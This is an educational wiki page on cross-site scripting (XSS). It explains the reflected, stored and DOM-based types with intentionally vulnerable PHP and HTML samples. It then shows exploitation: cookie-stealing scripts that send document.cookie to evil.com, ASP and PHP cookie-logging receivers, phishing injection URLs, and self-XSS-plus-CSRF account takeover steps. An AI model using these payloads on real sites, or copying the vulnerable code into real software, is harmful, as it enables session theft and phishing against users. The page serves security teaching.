---
title: XSS
---

## Introduction to XSS

Cross-Site Scripting (XSS) is a computer security vulnerability that often appears in WEB applications. It is caused by
the insufficient filtering of user input by WEB applications. Attackers use website vulnerabilities to inject malicious
script code into web pages. When other users browse these web pages, the malicious code will be executed. The victimized
users may take various attacks such as cookie data theft, session hijacking, and phishing.

### Reflective XSS

Reflected Cross-Site Scripting (Reflected Cross-Site Scripting) is the most common and widely used one, which can attach
malicious scripts to the parameters of URL addresses.

Reflected XSS is generally used by attackers to induce users to visit a URL containing malicious code through specific
methods (such as email). When the victim clicks on these specially designed links, the malicious code will be directly
on the victim's host. Execute on the browser. This type of XSS usually appears in the search bar of the website, the
user's login port, etc., and is often used to steal client cookies or phishing.

Server-side code:

```php
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET) && $_GET['name'] != NULL) { 
    // Feedback for end user 
    echo'<pre>Hello '. $_GET['name'].'</pre>'; 
} 
?>
```

As you can see, the code directly references the `name` parameter without any filtering or checking, and there is an
obvious XSS vulnerability.

### Persistent XSS

Persistent Cross-Site Scripting is also equivalent to Stored Cross-Site Scripting.

This type of XSS does not require the user to click a specific URL to execute cross-site scripting. The attacker uploads
or stores malicious code in the vulnerable server in advance, and executes the malicious code as long as the victim
browses the page containing the malicious code. Persistent XSS generally appears in interactions such as website
messages, comments, and blog logs, and malicious scripts are stored in the database of the client or server.

Server-side code:

```php
<?php
  if( isset( $_POST['btnSign'])) {
    // Get input
    $message = trim( $_POST['mtxMessage'] );
    $name = trim( $_POST['txtName'] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysql_real_escape_string( $message );
    // Sanitize name input
    $name = mysql_real_escape_string( $name );
    // Update database
    $query = "INSERT INTO guestbook (comment, name) VALUES ('$message','$name' );";
    $result = mysql_query( $query) or die('<pre>'. mysql_error().'</pre>' );
    //mysql_close();}
?>
```

The code only deletes or escapes some whitespace characters, special symbols, and backslashes. It does not filter and
check XSS, and it is stored in the database. There is obviously a stored XSS vulnerability.

### DOM XSS

Traditional XSS vulnerabilities generally appear in server-side code, while DOM-Based XSS is a vulnerability based on
the DOM document object model, so it is affected by the script code of the client browser. Client-side JavaScript can
access the browser's DOM text object model, so it can determine the URL used to load the current page. In other words,
the client-side script program can dynamically check and modify the page content through the DOM. It does not depend on
the server-side data, but obtains the data in the DOM from the client (such as extracting data from the URL) and
executes it locally. On the other hand, browser users can manipulate some objects in the DOM, such as URL, location,
etc. If the data entered by the user on the client contains malicious JavaScript scripts, and these scripts are not
properly filtered and disinfected, the application may be subject to DOM-based XSS attacks.

HTML code:

```html
<html>
<head>
    <title>DOM-XSS test</title>
</head>
<body>
<script>
    var a = document.URL;
    document.write(a.substring(a.indexOf("a=") + 2, a.length));
</script>
</body>
</html>
```

Save the code in domXSS.html, browser access:

```text
http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script>
```

You can trigger the XSS vulnerability.

## XSS usage

### Cookies stealing

The attacker can use the following code to obtain the cookie information of the client:

```html
<script>
    document.location = "http://www.evil.com/cookie.asp?cookie=" + document.cookie
    new Image().src = "http://www.evil.com/cookie.asp?cookie=" + document.cookie
</script>
<img src="http://www.evil.com/cookie.asp?cookie=" +document.cookie></img>
```

On the remote server, there is a file that accepts and records Cookies information, an example is as follows:

```asp
<%
  msg=Request.ServerVariables("QUERY_STRING")
  testfile=Server.MapPath("cookie.txt")
  set fs=server.CreateObject("Scripting.filesystemobject")
  set thisfile=fs.OpenTextFile(testfile,8,True,0)
  thisfile.Writeline(""&msg& "")
  thisfile.close
  set fs=nothing
%>
```

```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie. "\n");
fclose($log);
?>
```

After the attacker obtains the cookies, he can log in to the victim's account by modifying the cookies of the local
browser.

### Session hijacking

Due to certain security flaws in the use of Cookies, developers have begun to use some more secure authentication
methods, such as Session. In the Session mechanism, the client and server use identifiers to identify users and maintain
the session, but this identifier may also be used by others. The essence of session hijacking is to bring Cookies in the
attack and send them to the server.

For example, there is a stored XSS vulnerability in the message system of a CMS. The attacker writes the XSS code into
the message message. When the administrator logs in to the background and checks Yes, the XSS vulnerability will be
triggered. Since XSS is triggered in the background, the attack is The target is an administrator. By injecting
JavaScript code, an attacker can hijack the administrator's session to perform certain operations, thereby achieving the
purpose of elevating permissions.

For example, if an attacker wants to use XSS to add an administrator account, he only needs to use the previous code
audit or other methods to intercept the HTTP request information when adding the administrator account, and then use the
XMLHTTP object to send an HTTP request in the background. The request is accompanied by the cookies of the attacked and
sent to the server together, and then the operation of adding an administrator account can be realized.

### Phishing

- Redirect phishing

      Redirect the current page to a phishing page.
      
      ```text
      http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
      ```

- HTML injection phishing

      Use XSS vulnerabilities to inject HTML or JavaScript code into the page.
      
      ```text
      http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center; "><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password :<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/> </form></div></body></html>
      ```
      
      This code will embed a Form in the normal page.

- iframe fishing

      This method uses the `<iframe>` tag to embed a page in a remote domain to implement phishing.
      
      ```text
      http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"</iframe>
      ```

- Flash fishing

      Transfer the constructed Flash file to the server and use the `<object>` or `<embed>` tag to reference it on the target
      website.

- Advanced fishing techniques
      
      Inject code to hijack HTML forms, use JavaScript to write keyloggers, etc.

### Web page hanging horse

It is usually achieved by tampering with web pages, such as using the `<iframe>` tag in XSS.

### DOS and DDOS

Injecting malicious JavaScript code may cause some denial of service attacks.

### XSS Worm

Through the carefully constructed XSS code, many functions such as illegal transfer, tampering of information, deletion
of articles, self-copying, etc. can be realized.

## Self-XSS turning waste into treasure

Self-XSS, as the name implies, is that a point with XSS vulnerabilities can only be triggered by the attacker himself,
that is, he attacks his own. For example, the input point of personal privacy has XSS. However, since this private
information can only be viewed by the user, it cannot be used to attack others. Such loopholes are usually very small
and seem a bit tasteless. But in some specific scenarios, combining with other vulnerabilities (such as CSRF) can turn
Self-XSS into a harmful vulnerability. The following will summarize some common scenarios where Self-XSS can be used.

- CSRF exists for login and logout, Self-XSS for personal information, third-party login

      The general utilization process of this scenario is that the attacker first injects the payload into the personal
      information XSS point, and then the attacker creates a malicious page to induce the victim to visit, and the 
      malicious page performs the following operations:
      
      1. The malicious page execution uses CSRF to let the victim log in to the attacker's personal information location
         and trigger the XSS payload
      2. JavaScript Payload generates `<iframe>` tags, and performs the following operations in the frame
      3. Ask the victim to log out of the attacker's account
      4. Then let the victim log in to his account personal information interface through CSRF
      5. The attacker extracts the CSRF Token from the page
      6. Then you can use CSRF Token to submit and modify the user's personal information
      
      This attack process needs to pay attention to several points: the third step of login does not require user 
      interaction, use Google Sign In and other non-password login methods to log in; **X-Frame-Options** needs to be 
      set to the same source (this page Can be displayed in the `iframe` of the page with the same domain name)

- CSRF exists for login, Self-XSS exists for account information, OAUTH authentication
      1. Let the user log out of the account page, but do not log out of the OAUTH authorization page, this is to ensure that
         the user can log in to his account page again
      2. Let users log in to our account page and XSS appears, and use the `<iframe>` tag to execute malicious code
      3. Log in to their respective accounts, but our XSS has been stolen to the Session